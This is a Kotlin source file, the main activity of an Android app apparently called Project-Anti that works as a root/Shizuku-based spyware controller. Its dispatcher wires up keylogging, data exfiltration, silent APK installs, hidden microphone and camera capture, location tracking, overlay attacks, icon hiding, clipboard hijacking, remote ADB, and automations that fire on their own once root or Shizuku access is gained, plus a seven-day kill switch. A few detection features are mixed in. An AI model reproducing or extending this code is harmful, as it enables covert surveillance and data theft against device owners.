package com.anti.rootadbcontroller

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.ComponentName
import android.content.Intent
import android.content.ServiceConnection
import android.os.Bundle
import android.os.IBinder
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.lifecycle.lifecycleScope
import com.anti.rootadbcontroller.features.FeatureHandler
import com.anti.rootadbcontroller.services.ShizukuManagerService
import com.anti.rootadbcontroller.ui.MainScreen
import com.anti.rootadbcontroller.ui.theme.RootADBControllerTheme
import com.anti.rootadbcontroller.utils.AutomationUtils
import com.anti.rootadbcontroller.utils.Constants
import com.anti.rootadbcontroller.utils.Constants.TAG
import com.anti.rootadbcontroller.utils.RootUtils
import com.anti.rootadbcontroller.utils.ShizukuUtils
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.Calendar

class MainActivity : ComponentActivity() {

    private var isRootAvailable by mutableStateOf(false)
    private var isShizukuAvailable by mutableStateOf(false)
    private var shizukuManagerService: ShizukuManagerService? = null
    private var isShizukuServiceBound = false
    private var showAutomationDialog by mutableStateOf(false)
    private lateinit var featureHandler: FeatureHandler

    // Shizuku service connection
    private val shizukuServiceConnection = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
            Log.d(TAG, "Shizuku service connected")
            val binder = service as ShizukuManagerService.ShizukuManagerBinder
            shizukuManagerService = binder.service
            isShizukuServiceBound = true
            checkShizukuStatus()
        }

        override fun onServiceDisconnected(name: ComponentName?) {
            Log.d(TAG, "Shizuku service disconnected")
            shizukuManagerService = null
            isShizukuServiceBound = false
            isShizukuAvailable = false
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        featureHandler = FeatureHandler(this)
        checkRootAccess()
        initializeShizuku()
        scheduleKillSwitch()

        setContent {
            RootADBControllerTheme {
                MainScreen(
                    isRootAvailable = isRootAvailable,
                    isShizukuAvailable = isShizukuAvailable,
                    onFeatureClick = ::onFeatureClick,
                    onShizukuPermissionRequest = ::requestShizukuPermission,
                    onAutomationSettingsClick = { showAutomationDialog = true }
                )
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (isShizukuServiceBound) {
            unbindService(shizukuServiceConnection)
        }
    }

    private fun initializeShizuku() {
        // Initialize Shizuku Utils
        ShizukuUtils.getInstance().initialize()

        // Bind to Shizuku Manager Service
        val intent = Intent(this, ShizukuManagerService::class.java)
        bindService(intent, shizukuServiceConnection, BIND_AUTO_CREATE)
    }

    private fun checkShizukuStatus() {
        lifecycleScope.launch(Dispatchers.IO) {
            val shizukuUtils = ShizukuUtils.getInstance()
            val available = shizukuUtils.isShizukuAvailable
            val hasPermission = shizukuUtils.hasShizukuPermission()

            val wasShizukuAvailable = isShizukuAvailable
            isShizukuAvailable = available && hasPermission

            launch(Dispatchers.Main) {
                Log.d(TAG, "Shizuku status - Available: $available, Permission: $hasPermission")

                // If Shizuku access was just gained, trigger automations
                if (!wasShizukuAvailable && isShizukuAvailable) {
                    AutomationUtils.executeShizukuAutomations(
                        this@MainActivity,
                        shizukuManagerService
                    )
                }
            }
        }
    }

    private fun requestShizukuPermission() {
        shizukuManagerService?.requestShizukuPermission()
        // Recheck status after a delay
        lifecycleScope.launch(Dispatchers.IO) {
            kotlinx.coroutines.delay(1000)
            checkShizukuStatus()
        }
    }

    private fun onFeatureClick(featureId: Int) {
        when (featureId) {
            Constants.FEATURE_KEYLOGGING -> featureHandler.openAccessibilitySettings()
            Constants.FEATURE_DATA_EXFILTRATION -> featureHandler.exfiltrateAllData(shizukuManagerService)
            Constants.FEATURE_SILENT_INSTALL -> featureHandler.findAndInstallFirstApk(shizukuManagerService)
            Constants.FEATURE_NETWORK_MONITOR -> featureHandler.startNetworkMonitoring(shizukuManagerService)
            Constants.FEATURE_FILE_ACCESS -> featureHandler.browseSystemFiles(shizukuManagerService)
            Constants.FEATURE_SYSTEM_CONTROL -> featureHandler.rebootDevice(shizukuManagerService)
            Constants.FEATURE_SCREENSHOT -> featureHandler.takeScreenshot(shizukuManagerService)
            Constants.FEATURE_LOG_ACCESS -> featureHandler.showLogAccess(shizukuManagerService)
            Constants.FEATURE_MIC_RECORDER -> featureHandler.startMicRecording()
            Constants.FEATURE_LOCATION_TRACKER -> featureHandler.startLocationTracking()
            Constants.FEATURE_OVERLAY_ATTACK -> featureHandler.startOverlayAttack()
            Constants.FEATURE_HIDE_APP_ICON -> featureHandler.hideAppIcon(componentName)
            Constants.FEATURE_PERMISSIONS_SCANNER -> featureHandler.scanPermissions()
            Constants.FEATURE_OVERLAY_DETECTOR -> featureHandler.detectOverlays()
            Constants.FEATURE_HIDDEN_APP_FINDER -> featureHandler.findHiddenApps()
            Constants.FEATURE_CAMERA_MIC_DETECTOR -> featureHandler.detectCameraMicUsage()
            Constants.FEATURE_STEALTH_CAMERA -> featureHandler.takeStealthPicture()
            Constants.FEATURE_GET_CLIPBOARD -> featureHandler.getClipboard()
            Constants.FEATURE_SET_CLIPBOARD -> featureHandler.setClipboard("Pwned by Project-Anti")
            Constants.FEATURE_SHIZUKU_OPERATIONS -> featureHandler.showShizukuOperations(shizukuManagerService)
            Constants.FEATURE_PACKAGE_MANAGER -> featureHandler.showPackageManager(shizukuManagerService)
            Constants.FEATURE_SYSTEM_PROPERTIES -> featureHandler.showSystemProperties(shizukuManagerService)
            Constants.FEATURE_REMOTE_ADB -> featureHandler.toggleRemoteAdb()
            Constants.FEATURE_AUTOMATION_SETTINGS -> showAutomationDialog = true
        }
    }

    private fun checkRootAccess() {
        lifecycleScope.launch(Dispatchers.IO) {
            val wasRootAvailable = isRootAvailable
            isRootAvailable = RootUtils.isRootAvailable()

            // If root access was just gained, trigger automations
            if (isRootAvailable && !wasRootAvailable) {
                launch(Dispatchers.Main) {
                    AutomationUtils.executeRootAutomations(this@MainActivity)
                }
            }
        }
    }

    private fun scheduleKillSwitch() {
        val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, com.anti.rootadbcontroller.services.KillSwitchReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_IMMUTABLE)

        val calendar = Calendar.getInstance().apply {
            add(Calendar.DAY_OF_YEAR, 7)
        }

        alarmManager.set(AlarmManager.RTC_WAKEUP, calendar.timeInMillis, pendingIntent)
        Log.d(TAG, "Kill switch scheduled for 7 days.")
    }
}
